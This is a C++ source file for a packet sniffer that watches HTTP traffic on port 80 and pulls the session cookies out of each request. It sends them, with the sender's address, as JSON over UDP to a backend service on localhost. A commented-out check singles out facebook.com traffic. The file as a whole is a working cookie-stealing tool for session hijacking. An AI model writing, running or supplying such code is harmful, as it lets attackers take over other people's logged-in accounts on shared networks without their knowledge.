#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdexcept>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "packet_sniffer.hpp"
#include <netdb.h>
#include <signal.h>
#define PORT 51718
using namespace std;

extern "C" {
#include "../JSON/json.h"
}
    


/* Global declarations */

void error(string msg)
{
  perror((msg.c_str()));
  exit(1);
}


void sig_handler(int sig){
    
    cout<<"Got ctrl-c signal, Exiting backend service....\n";
    
    exit(0);
}


void data_transfer(string fval, string cval){
    
  int sockfd, portno = PORT, n,servlen;
  string host = "localhost";
  struct sockaddr_in serv_addr;
  struct hostent *server;
  const char *buffer;
  struct json_object * jobj;
  struct json_object *fstr, *cstr;
  string from = "from";
  string cookie = "cookie";
  //cout<<"opening datagram socket\n";
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  //cout<<"socket opening successful\n";
    if (sockfd < 0)
        error("ERROR opening socket");
    //cout<<"getting hostbyname\n";    
    server = gethostbyname(host.c_str());
    if (server == NULL)
    {
        fprintf(stderr,"ERROR, no such host");
        exit(0);
    }
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  bcopy((char *)server->h_addr,(char *)&serv_addr.sin_addr.s_addr, server->h_length);
  serv_addr.sin_port = htons(portno);
  servlen = sizeof(serv_addr);
  //cout<<"packing object stuff\n";
  /* Pack into JSON object */
  /*Creating a json string*/
  //cout<<"packing into json object\n";
  jobj = json_object_new_object();
  fstr = json_object_new_string((char*)fval.c_str());
  cstr = json_object_new_string((char*)cval.c_str());
  /*Form the json object*/
  json_object_object_add(jobj,(char*)from.c_str(), fstr);
  json_object_object_add(jobj,(char*)cookie.c_str(), cstr);
  /*Now printing the json object*/
  buffer = json_object_to_json_string(jobj);
  cout<<buffer<<"\n";
  n=sendto(sockfd,buffer,strlen(buffer),0,(const struct sockaddr *)&serv_addr,servlen);
  if (n < 0)
    error("ERROR Sending to server");
    
  cout<<"--------Sending cookie for http request---------\n";
  if(sockfd > 0)
    close(sockfd);
    
}
    
      
    

void receivePacket(HttpPacket *packet){
    
    
    /*cout<<"--------------------------------------------------\n";
    cout<<"from : ["<<packet->from()<<"]\n";
    cout<<"to : ["<<packet->to()<<"]\n";
    cout<<"method : ["<<packet->method()<<"]\n";
    cout<<"path : ["<<packet->path()<<"]\n";
    cout<<"query : ["<<packet->query()<<"]\n";
    cout<<"host : ["<<packet->host()<<"]\n";
    cout<<"Cookies : ["<<packet->cookies()<<"]\n";
    cout<<"Useragent : ["<<packet->user_agent()<<"]\n";
   // cout<<"Packet : ["<<packet->getpayload()<<"]\n"; 
    cout<<"----------------------------------------------------\n";
    
  struct json_object * jobj;
  struct json_object *fstr, *cstr;
  string from = "from";
  string cookie = "cookie";
  string fval = packet->from();
  string cval = packet->cookies();
  char *buffer;
  jobj = json_object_new_object();
  fstr = json_object_new_string((char*)fval.c_str());
  cstr = json_object_new_string((char*)cval.c_str());
  
  json_object_object_add(jobj,(char*)from.c_str(), fstr);
  json_object_object_add(jobj,(char*)cookie.c_str(), cstr);
  
  buffer = json_object_to_json_string(jobj);
  cout<<buffer<<"\n";
  
 cout<<"In receive packet\n";
 cout<<"host : ["<<packet->host()<<"]\n";  */
   string host = packet->host();
    string from = packet->from();
    string cookies = packet->cookies();
    string str("www.facebook.com");
  //  if(host.compare("www.facebook.com") || host.compare("www.touch.facebook.com")){
        
        if(!cookies.empty()){
            
           // cout<<" Cookie Transfer in progress....\n";
            data_transfer(from, cookies);
        }
        
   // } 
        
        
    
    
    
}



int main(int argc, char** argv){
    
  if (argc < 2) {
    cerr << "Syntax: " << argv[0] << " <interface>" << endl;
    return EXIT_FAILURE;
  }
  
  string inface(argv[1]);
  string filter("port 80");
  //signal(SIGABRT, &sighandler);
  //signal(SIGTERM, &sighandler);
  signal(SIGINT, &sig_handler);
  
  
  
  try{
      PacketSniffer httpsniffer(inface,filter,receivePacket);
      httpsniffer.start();
  }
    catch(exception &e){
        cerr << e.what() <<"\n";
        return EXIT_FAILURE;
    }
    
    
    return EXIT_SUCCESS;
}



